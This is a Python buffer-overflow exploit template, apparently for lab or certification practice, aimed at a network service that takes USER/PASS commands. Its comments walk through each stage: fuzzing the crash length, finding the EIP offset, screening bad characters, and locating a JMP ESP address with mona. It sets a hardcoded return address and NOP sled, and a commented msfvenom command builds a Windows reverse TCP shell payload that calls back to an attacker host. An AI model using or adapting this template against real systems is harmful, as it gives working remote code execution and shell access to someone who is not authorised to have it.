#!/usr/bin/python

import socket
import sys
import subprocess

TARGET = "xx.xx.xx.xx"
PORT = 0
PATH = ''

CRASH_LEN = 0
OVERFLOW_LEN = 0
JMP_ESP = '\x8f\x35\x4a\x5f'
NOP_SLED = "\x90" * 32

send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n'))
sub_proc = lambda cmd_list : str(subprocess.check_output(cmd_list)).strip()

# 1. Confirm crash 
payload = "A" * CRASH_LEN

# 2. Create pattern and get offset/OVERFLOW_LEN
# payload = sub_proc(['python', '/opt/pattern.py', '-l', str(CRASH_LEN)])

# 3. Confirm EIP Overwrite
# payload = "A" * OVERFLOW_LEN + "B" * 4 + "C" * (CRASH_LEN - OVERFLOW_LEN - 4)

# 4. Confirm bad characters
# bad_chars = sub_proc(['python', '/opt/bad_chars.py'])
# payload = "A" * OVERFLOW_LEN + "B" * 4 + bad_chars

# 5. Get JMP_ESP
# !mona modules
# nasm_shell: jmp esp
# !mona find -s "\xff\xe4" -m ???.dll

# 4. Confirm JMP_ESP redirection
# payload = "A" * OVERFLOW_LEN + JMP_ESP + "C" * (CRASH_LEN - OVERFLOW_LEN - 4)

# --- Final ---
# EXAMPLE: msfvenom -p windows/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=1337 EXITFUNC=thread -b "\x00\x0a\x0d" -f c -a x86
# payload =  ("")
# junk =  "C" * (CRASH_LEN - OVERFLOW_LEN - len(JMP_ESP) - len(payload) - len(NOP_SLED))
# payload = "A" * OVERFLOW_LEN + JMP_ESP + NOP_SLED + payload + junk

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))
    s.recv(1024)
    send(s, 'USER', 'test')
    s.recv(1024)
    send(s, 'PASS ', payload)
    s.recv(1024)
    send(s, 'QUIT', '')
    s.close()
except Exception as e:
    print("DEBUG INFO: {}".format(e))
    sys.exit()
